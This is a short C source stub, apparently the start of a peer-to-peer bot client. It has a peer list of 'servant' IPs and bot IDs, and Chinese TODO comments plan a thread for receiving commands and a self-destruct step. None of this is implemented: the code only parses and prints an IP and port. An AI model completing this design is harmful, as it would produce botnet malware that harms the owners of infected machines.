#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "tool.h"
#include <sys/socket.h>
#include <pthread.h>
typedef struct
{
    uint32_t ServantIP;
    uint16_t ServantPort;
    char *BotID;
    uint32_t FailCount;
} Peer;
Peer peer_list[10];//维护一个peer_list
void update_peer(Peer peer,int hop)
{

}
int main(int argc, char const *argv[])
{
    Input *user_input = check_input(argc, argv);
    //TODO:开一个线程去接收命令,主线程去命令队列里面去取命令去做?
    if (user_input != NULL)
    {
        printf("%d\n",user_input->IP);
        printf("%d\n", user_input->Port);
    }
    //TODO:自销毁
    return 0;
}